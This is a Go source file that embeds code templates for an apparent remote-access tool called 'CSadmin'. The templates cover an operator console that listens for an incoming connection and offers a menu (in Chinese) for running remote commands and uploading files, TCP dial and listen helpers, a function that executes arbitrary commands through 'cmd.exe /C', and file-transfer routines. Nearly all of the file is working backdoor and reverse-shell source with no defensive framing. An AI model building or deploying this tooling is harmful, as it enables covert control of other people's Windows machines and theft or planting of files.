package code

var MainS string = `

package main

import "CSadmin/action"

func main() {
	action.Conn_ip()

}

`

var ConnS string = `
package action

import (
	"CSadmin/function"
	"CSadmin/upload"
	"fmt"
	"net"
	"strings"
)

var port string
var ip string
var shell string
var ok string
var check string
var file string

func Conn_ip() {

	port := "%v"
	conn := function.Lis_net(port)
connall:
	for {
		choose := SwitchChoose()
		// fmt.Print(choose)
		switch choose {
		case "1":
			code_check_shell := "Xioaruanshell"
			function.Write_conn(conn, code_check_shell)
			for {
				pwd := function.Read_conn(conn)
				pwd = strings.Replace(pwd, "\n", "", -1)
				fmt.Printf("%v >", pwd)
				function.Scanf(&shell)
				if shell == "exit()" {
					check = "no"
					function.Write_conn(conn, check)
					goto connall
				}
				chechkongeg(shell, conn, pwd)
				function.Write_conn(conn, shell)
				output := function.Read_conn(conn)
				fmt.Println(output)
				ok = "ok"
				function.Write_conn(conn, ok)
			}
		case "2":
			code_check_shell := "XioaruanUpload"
			function.Write_conn(conn, code_check_shell)
			for {
				files := "File"
				fmt.Printf("%v >", files)
				function.Scanf(&file)
				if file == "exit()" {
					check = "no"
					function.Write_conn(conn, check)
					goto connall
				}
				code := upload.CheckFile(file)
				if code == "no" {
					fmt.Println("文件不存在")
					continue
				}
				filebase := upload.CheckFileName(file)
				fmt.Println(filebase)
				function.Write_conn(conn, filebase)
				upload.Doupload(file, conn)
			}
		default:
			fmt.Println("还没有开发哦~")
			goto connall
		}
	}
	// defer conn.Close()

}

func chechkongeg(shell string, conn net.Conn, pwd string) {
	if shell == "" {
		fmt.Println("命令为空")
		fmt.Printf("%v >", pwd)
		function.Scanf(&shell)
		function.Write_conn(conn, shell)

		chechkongeg(shell, conn, pwd)
	}
}

`

var SwtichS string = `
package action

import (
	"CSadmin/function"
	"fmt"
)

func SwitchChoose() string {
	fmt.Println("【1】 执行命令 【2】 文件上传 【3】 暂未开发")
	fmt.Print("choose >")
	var choose string

	function.Scanf(&choose)
	return choose
}

`

var Connfunc string = `
package function

import (
	"fmt"
	"net"
	"os"
)

func Conn_net(ip string, port string) net.Conn {

	ipaddr := fmt.Sprintf("%v:%v", ip, port)
	lis, err := net.Dial("tcp", ipaddr)
	if err != nil {
		fmt.Println("链接错误")
		os.Exit(0)
	}
	return lis
}

func Lis_net(port string) net.Conn {
	// time.Sleep(time.Second * 2)
	new_port := ":" + port
	lis, err := net.Listen("tcp", new_port)
	if err != nil {
		fmt.Println("监听错误", err)
		os.Exit(0)
	}
	fmt.Printf("开始监听 > %v\n", port)
	conn, _ := lis.Accept()
	return conn
}

func Read_conn(conn net.Conn) string {
	buf := make([]byte, 20*50*1024*1024)
	n, err := conn.Read(buf)
	if err != nil {
		fmt.Println("读取错误")
		os.Exit(0)
	}
	output := string(buf[:n])
	return output
}
func Write_conn(conn net.Conn, str string) {
	_, _ = conn.Write([]byte(str))
}

`

var ExecS string = `

package function

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"

	"golang.org/x/text/encoding/simplifiedchinese"
)

func GetPwd() string {
	pwd, _ := os.Getwd()
	return pwd
}

func ExecCode(shell string) string {
	test := strings.Fields(shell)
	if test[0] == "cd" && len(test) > 1 {
		output := Cd_deal(shell)
		_, _ = simplifiedchinese.GB18030.NewDecoder().String(string(output))
		return "change pwd !"
	} else {

		cmd := exec.Command("cmd.exe", "/C", shell)
		output, _ := cmd.CombinedOutput()
		out, _ := simplifiedchinese.GB18030.NewDecoder().String(string(output))
		return out
	}
}
func Cd_deal(cmd string) string {
	workingDir, _ := os.Getwd()
	parts := strings.Fields(cmd)
	if parts[0] == "cd" && len(parts) > 1 {
		newDir := parts[1]
		if newDir == "-" {
			// 处理特殊情况：切换到上一个工作目录
			workingDir, _ = os.Getwd()
		} else {
			// 将相对路径转换为绝对路径
			if !filepath.IsAbs(newDir) {
				newDir = filepath.Join(workingDir, newDir)
			}

			// 检查新目录是否存在
			_, err := os.Stat(newDir)
			if err == nil {
				workingDir = newDir
			} else {
				fmt.Println("目录不存在:", newDir)
			}
		}

		// 更新当前工作目录
		err := os.Chdir(workingDir)
		if err != nil {
			fmt.Println("切换目录失败:", err)
		}

	}
	return workingDir
}

`

var Use string = `

package function

import (
	"bufio"
	"math/rand"
	"os"
	"time"
)

func Scanf(a *string) {
	reader := bufio.NewReader(os.Stdin)
	data, _, _ := reader.ReadLine()

	*a = string(data)
}

func RandNum() int {
	rand.Seed(time.Now().UnixNano()) //时间戳为种子
	r := rand.Intn(65535)
	return r
}

`
var Gosum string = `
golang.org/x/text v0.14.0 h1:ScX5w1eTa3QqT8oi6+ziP7dTV1S2+ALU0bI+0zXKWiQ=
golang.org/x/text v0.14.0/go.mod h1:18ZOQIKpY8NJVqYksKHtTdi31H5itFRjB5/qKTNYzSU=
`
var Gomod string = `module CSadmin

go 1.21.5

require golang.org/x/text v0.14.0
`

var Upload_admin_win_upload string = `package upload

import (
	"bufio"
	"encoding/binary"
	"fmt"
	"io"
	"net"
	"os"
	"path/filepath"
	"time"
)

func CheckFile(file string) string {
	_, err := os.Open(file)
	if err != nil {
		return "no"
	} else {
		return "yes"
	}
}

func CheckFileName(file string) string {
	filename := filepath.Base(file)
	return filename
}

func Doupload(file string, conn net.Conn) {
	fileinfo, _ := os.Stat(file)
	size := fileinfo.Size()
	bytes := INt_to_byte(size)
	conn.Write(bytes)
	fmt.Println(size)
	//开始传输文件
	total := 0
	time.Sleep(time.Microsecond * 300)
	filebuf := make([]byte, 1000)
	srcfile, _ := os.Open(file)
	reader := bufio.NewReader(srcfile)
	for {
		n, err := reader.Read(filebuf)
		if err == io.EOF {
			fmt.Println("发送完毕")
			return
		} else {
			_, e := conn.Write(filebuf[:n])
			handler(e, "write")
			total += n
		}
	}
}

func handler(e error, when string) {
	if e != nil {
		fmt.Println("err", e, when)
		return
	}
}
func INt_to_byte(int int64) []byte {
	var buf = make([]byte, 8)
	binary.BigEndian.PutUint64(buf, uint64(int))
	return buf
}
 `
